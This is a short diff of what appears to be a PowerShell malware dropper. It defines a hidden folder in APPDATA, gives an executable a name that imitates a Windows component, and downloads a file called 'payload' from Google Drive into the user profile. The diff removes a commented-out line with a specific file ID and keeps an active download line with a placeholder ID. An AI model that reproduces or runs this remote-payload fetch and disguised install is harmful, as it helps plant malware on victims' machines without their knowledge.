@@ -8,7 +8,6 @@ $dummy_name_no_exe = "WindowsApplicationModel"
 $hidden_path = $env:APPDATA + "\$dummy_name_no_exe"
 $dummy_name = "$dummy_name_no_exe.exe"
 
-# Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1q_LN0cCSsE7aSbmteOIPfz-w1dRtMNwc" -OutFile "$env:USERPROFILE\payload.txt"
 Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=__PUT_FILE_ID_HERE__" -OutFile "$env:USERPROFILE\payload.txt"
 
 if (!(Test-Path "$hidden_path")){
